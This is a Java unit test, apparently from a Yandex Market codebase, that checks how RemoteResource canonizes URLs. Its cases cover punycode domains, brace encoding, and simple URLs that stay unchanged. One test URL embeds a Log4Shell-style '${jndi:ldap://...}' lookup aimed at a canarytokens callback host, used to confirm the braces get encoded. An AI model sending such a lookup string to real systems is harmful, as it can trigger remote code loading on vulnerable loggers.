package ru.yandex.market.core.misc.resource;

import java.net.MalformedURLException;
import java.net.URISyntaxException;
import java.util.stream.Stream;
import org.junit.Assert;
import org.junit.jupiter.api.Assertions;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.Arguments;
import org.junit.jupiter.params.provider.MethodSource;

public class RemoteResourceTest extends Assert {

    private static Stream<Arguments> complexUrl() {
        return Stream.of(
                Arguments.of(
                        "https://недорогиедиваны.рф/e/share/yandex_market",
                        "https://xn--80adcdbdcxc7bjea1a8o.xn--p1ai/e/share/yandex_market"
                ),
                Arguments.of(
                        "https://kostroma.takaro.ru/index.php?route=feed/yandex_market&city_code={D44}",
                        "https://kostroma.takaro.ru/index.php?route=feed/yandex_market&city_code=%7BD44%7D"
                ),
                Arguments.of(
                        "https://spqr.zz.mu/xxe.xml?${jndi:ldap://xXXX.L4J.z5byrf4j229lm8p3gt8acnh90.canarytokens.com/a}",
                        "https://spqr.zz.mu/xxe.xml?$%7Bjndi:ldap://xXXX.L4J.z5byrf4j229lm8p3gt8acnh90.canarytokens.com/a%7D"
                ),
                Arguments.of(
                        "https://perm_city.aspro-rus.ru/bitrix/catalog_export/kant_ymlexport/yandex_market_STORE_ID_46.yml",
                        "https://perm_city.aspro-rus.ru/bitrix/catalog_export/kant_ymlexport/yandex_market_STORE_ID_46.yml"
                )

        );
    }

    @ParameterizedTest(name = "{0}")
    @MethodSource("complexUrl")
    public void testUrlCanonization(String url, String expectedCanonizeUrl) throws MalformedURLException, URISyntaxException {
        RemoteResource remoteResource = RemoteResource.of(url);
        RemoteResource canonize = RemoteResource.canonize(remoteResource, true);

        Assertions.assertEquals(expectedCanonizeUrl, canonize.url());

    }

    private static Stream<String> simpleUrl() {
        return Stream.of("http://basmont.ru/scripts/yandex.php",
                "http://www.kornero.ru/shop/index.php?do=yandex"
        );
    }

    @ParameterizedTest(name = "{0}")
    @MethodSource("simpleUrl")
    public void testNoSideEffectForSimpleUrl(String url) throws MalformedURLException, URISyntaxException {
        RemoteResource resource = RemoteResource.of(url);
        Assertions.assertEquals(RemoteResource.canonize(resource, true),
                RemoteResource.canonize(resource, false));

    }
}

